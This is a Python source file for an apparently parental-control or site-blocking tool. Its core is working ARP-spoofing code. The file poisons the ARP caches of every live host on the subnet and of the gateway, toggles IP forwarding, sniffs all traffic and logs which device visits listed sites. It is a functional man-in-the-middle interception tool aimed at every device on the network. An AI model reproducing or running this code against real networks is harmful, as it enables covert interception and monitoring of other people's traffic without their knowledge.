import os
import socket
import threading
import time

import dns.resolver
import dns.reversename
import scapy.all as scapy

from Status import SpooferStatus

'''
A class that handles the network activities.
includes:
1. Finding active ips
2. Spoofing them
3. Listening to incoming packets
4. Filtering the packets
5. Redirecting the packets or passing an alert to the app according to the rules
'''


class Spoofer:
    def __init__(self, network):
        self.network = network
        self.mode = None
        self.forbidden_hosts = {}
        self.forbidden_urls = []
        self.status = SpooferStatus.OFF
        self.forbidden_packets = []

    '''
    A function that start threads for every ip in the subnet that make the host computer become a MITM between the 
    ip and the router.
    '''

    def thread_starter(self):
        self.status = SpooferStatus.SCANNING
        if self.mode == "Supervisor":
            os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

        elif self.mode == "Blocker":
            os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

        threading.Thread(target=self.find_mac, args=(self.network.host_ip, 'host')).start()
        threading.Thread(target=self.find_mac, args=(self.network.getaway_ip, 'getaway')).start()
        if self.status is SpooferStatus.OFF:
            return
        self.status = SpooferStatus.SPOOFING
        for ip in self.network.available_ips:
            threading.Thread(target=self.spoof, args=(ip,)).start()

        threading.Thread(target=self.listener, ).start()
        if self.status is SpooferStatus.OFF:
            return
        self.status = SpooferStatus.RUNNING

    '''
    A function that handles checking if the ip is alive and spoofing it and the router and becoming a MITM.
    '''

    def spoof(self, ip):
        while self.network.getaway_mac is None:
            pass

        while self.status is not SpooferStatus.OFF:
            mac = self.find_mac(ip, "normal")
            if mac is not None:
                if ip not in self.network.active_ips:
                    self.network.active_ips.append(ip)

                victim_ether = scapy.Ether(src=self.network.getaway_mac, dst=mac)
                victim_arp = scapy.ARP(op=2, psrc=self.network.getaway_ip, pdst=ip,
                                       hwdst=mac)
                router_ether = scapy.Ether(src=mac, dst=self.network.getaway_mac)
                router_arp = scapy.ARP(op=2, psrc=ip, pdst=self.network.getaway_ip,
                                       hwdst=self.network.getaway_mac)
                victim_packet = victim_ether / victim_arp
                router_packet = router_ether / router_arp
                for i in range(0, 100):
                    if self.status is SpooferStatus.OFF:
                        break

                    scapy.sendp(victim_packet, verbose=False)
                    scapy.sendp(router_packet, verbose=False)
                    time.sleep(2.5)
            else:
                if ip in self.network.active_ips:
                    self.network.active_ips.remove(ip)
                    for i in range(60):
                        if self.status is SpooferStatus.OFF:
                            break
                        time.sleep(5)

        if ip in self.network.active_ips:
            victim_ether = scapy.Ether(src=self.network.getaway_mac, dst=mac)
            victim_arp = scapy.ARP(op=2, psrc=self.network.getaway_ip, hwsrc=self.network.getaway_mac, pdst=ip,
                                   hwdst=mac)
            router_ether = scapy.Ether(src=mac, dst=self.network.getaway_mac)
            router_arp = scapy.ARP(op=2, psrc=ip, hwsrc=mac, pdst=self.network.getaway_ip,
                                   hwdst=self.network.getaway_mac)
            victim_packet = victim_ether / victim_arp
            router_packet = router_ether / router_arp
            scapy.sendp(victim_packet, verbose=False, count=7)
            scapy.sendp(router_packet, verbose=False, count=7)

    '''
    A function that finds the mac of a requested ip.
    '''

    def find_mac(self, ip, target):
        mac = None
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
        response = str(answered_list).split("Other:")[1].replace(">", "")

        if response != '0':
            mac = answered_list[0][1].hwsrc

        if target == "normal":
            return mac

        elif target == "host":
            self.network.host_mac = mac

        elif target == "getaway":
            self.network.getaway_mac = mac

    '''
    A function that listens to incoming packets and forwards the traffic for advance checking. 
    '''

    def listener(self):
        while self.status is not SpooferStatus.OFF:
            packet = scapy.sniff(count=1)
            threading.Thread(target=self.check_packet, args=(packet,)).start()

    '''
    A function that checks if the incoming packet is sent to the host because its a MITM or a native traffic If 
    not native, checks if its source or destination is a forbidden site, if so passes an alert to the app, 
    if not redirect the packet.
     '''

    def check_packet(self, packet):
        try:
            src_ip = packet[0][scapy.IP].src
            dst_ip = packet[0][scapy.IP].dst
        except:
            src_ip = None
            dst_ip = None

        if src_ip is not None and dst_ip is not None:
            if dst_ip != self.network.host_ip and src_ip != self.network.host_ip:
                host = None
                try:
                    if src_ip in self.network.all_ips:
                        if dst_ip not in self.network.all_ips:
                            addrs = dns.reversename.from_address(dst_ip)
                            host = str(dns.resolver.resolve(addrs, "PTR")[0])
                    elif dst_ip in self.network.all_ips:
                        if src_ip not in self.network.all_ips:
                            addrs = dns.reversename.from_address(src_ip)
                            host = str(dns.resolver.resolve(addrs, "PTR")[0])
                except:
                    pass

                if host in list(self.forbidden_hosts.keys()) or dst_ip in list(
                        self.forbidden_hosts.keys()) or src_ip in list(self.forbidden_hosts.keys()):

                    if dst_ip in list(self.forbidden_hosts.keys()):
                        self.forbidden_packets.append(
                            f'{time.strftime("%H:%M:%S", time.localtime())} {src_ip} -> {self.forbidden_hosts[dst_ip]}\n')

                    elif src_ip in list(self.forbidden_hosts.keys()):
                        self.forbidden_packets.append(
                            f'{time.strftime("%H:%M:%S", time.localtime())} {dst_ip} -> {self.forbidden_hosts[src_ip]}\n')

                else:
                    if self.mode == "Blocker":
                        threading.Thread(target=self.redirect, args=(packet,)).start()

    '''
    A function that redirect allowed packets to their proper destination.
    '''

    def redirect(self, packet):
        packet[0][scapy.Ether].dst = self.network.getaway_mac
        scapy.sendp(packet, verbose=False)

    '''
    A function that add a forbidden ip and/or host by inputted url.
    '''

    def add_host(self, url):
        try:
            ip = socket.gethostbyname(url)
            if ip not in list(self.forbidden_hosts.keys()):
                self.forbidden_hosts[ip] = url
                if url not in self.forbidden_urls:
                    self.forbidden_urls.append(url)

        except:
            return False

        try:
            addrs = dns.reversename.from_address(ip)
            host = str(dns.resolver.resolve(addrs, "PTR")[0])
            if host not in list(self.forbidden_hosts.keys()):
                self.forbidden_hosts[host] = url
                # print(list(self.forbidden_hosts.keys()))
            return True
        except:
            return True

    '''
    A function that updates the forbidden host db
    '''

    def host_updater(self):
        while self.status is SpooferStatus.OFF:
            pass

        while self.status is not SpooferStatus.OFF:
            for url in self.forbidden_urls:
                self.add_host(url)
            time.sleep(5)

    '''
    A function that changes the mode of the spoofer to off so threads will be stopped.
    '''

    def turn_off(self):
        self.status = SpooferStatus.OFF
